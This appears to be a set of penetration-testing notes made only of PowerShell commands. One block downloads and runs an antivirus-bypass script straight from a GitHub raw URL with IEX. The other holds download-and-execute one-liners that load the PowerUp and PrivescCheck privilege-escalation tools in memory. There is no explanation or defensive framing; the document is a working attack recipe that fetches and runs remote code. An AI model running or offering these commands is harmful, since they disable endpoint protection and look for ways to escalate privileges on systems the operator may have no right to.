```
$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1')
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content);Invoke-AlokS-AvBypass
```


```
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks | Format-Table
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1') ;Invoke-PrivescCheck

get-item function:
```
